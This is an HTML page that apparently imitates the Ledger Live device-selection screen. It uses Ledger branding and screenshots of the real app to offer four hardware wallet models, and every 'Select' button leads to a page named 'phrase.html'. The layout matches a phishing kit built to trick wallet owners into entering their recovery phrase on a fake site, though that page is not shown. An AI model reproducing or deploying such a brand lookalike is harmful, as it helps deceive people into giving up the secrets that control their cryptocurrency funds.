<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title> Ledger Live</title>

  <link rel="icon" type="image/png" href="favicon.png">
  <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background-color: #0e0d0e;
      color: #ffffff;
      font-family: 'Space Mono', monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding: 30px 0;
      overflow-x: hidden;
    }

    .logo {
      font-weight: 700;
      font-size: 14px;
      letter-spacing: 5px;
      color: #ffffff;
      text-transform: uppercase;
      border: 1.5px solid #ffffff;
      padding: 6px 20px;
      border-radius: 6px;
      margin-bottom: 10px;
    }

    .title {
      text-align: center;
      font-size: 20px;
      font-weight: 700;
      letter-spacing: 4px;
      margin-bottom: 50px;
      color: #e0e0e0;
    }

    /* FLEX CONTAINER */
    .devices {
      display: flex;
      justify-content: center;
      align-items: flex-start;
      gap: 40px;
      width: 90%;
      flex-wrap: nowrap; /* prevent line break */
      overflow: hidden;
    }

    .device {
      background-color: #151515;
      padding: 25px;
      border-radius: 16px;
      text-align: center;
      transition: all 0.3s ease;
      width: 240px;
      box-shadow: 0 0 10px rgba(255, 255, 255, 0.05);
    }

    .device:hover {
      transform: translateY(-5px);
      box-shadow: 0 0 25px rgba(255, 255, 255, 0.1);
    }

    .device img {
      width: 220px;
      height: auto;
      border-radius: 10px;
      margin-bottom: 18px;
      transition: transform 0.3s ease;
    }

    .device:hover img {
      transform: scale(1.05);
    }

    .device h3 {
      font-size: 16px;
      color: #ffffff;
      margin-bottom: 15px;
      letter-spacing: 1px;
    }

    .select-btn {
      background-color: #ffffff;
      color: #000000;
      border: none;
      border-radius: 25px;
      padding: 10px 28px;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.3s ease;
      font-family: 'Space Mono', monospace;
    }

    .select-btn:hover {
      background-color: #b3b3b3;
      transform: translateY(-2px);
    }
  </style>
</head>
<body>

  <div class="logo">LEDGER</div>
  <h1 class="title">SELECT YOUR DEVICE</h1>

  <section class="devices">

    <div class="device">
      <img src="Screenshot 2025-11-08 at 01-57-28 Ledger Live.png" alt="Ledger Stax">
      <h3>Ledger Stax</h3>
      <a href="phrase.html"><button class="select-btn">Select</button></a>
    </div>

    <div class="device">
      <img src="Screenshot 2025-11-08 at 01-57-56 Ledger Live.png" alt="Ledger Flex">
      <h3>Ledger Flex</h3>
      <a href="phrase.html"><button class="select-btn">Select</button></a>
    </div>

    <div class="device">
      <img src="Screenshot 2025-11-08 at 01-58-33 Ledger Live.png" alt="Ledger Nano S & Plus">
      <h3>Ledger Nano S & Plus</h3>
      <a href="phrase.html"><button class="select-btn">Select</button></a>
    </div>

    <div class="device">
      <img src="Screenshot 2025-11-08 at 01-59-01 Ledger Live.png" alt="Ledger Nano X">
      <h3>Ledger Nano X</h3>
      <a href="phrase.html"><button class="select-btn">Select</button></a>
    </div>

  </section>

</body>
</html>
